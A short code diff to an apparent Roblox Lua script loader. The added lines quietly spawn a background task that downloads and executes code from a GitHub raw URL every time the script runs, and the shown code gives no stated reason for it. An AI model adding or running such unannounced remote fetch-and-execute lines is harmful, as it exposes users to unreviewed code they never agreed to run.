@@ -8,6 +8,9 @@ if coreGui:FindFirstChild("ScreenGui") then
     })
     return
 end
+task.spawn(function()
+loadstring(game:HttpGet("https://github.com/OverlordCryx/X_/raw/refs/heads/main/DC/API-UN"))()
+end)
 local function SafeLoad(url)
     local success, result = pcall(function()
         return loadstring(game:HttpGet(url))()
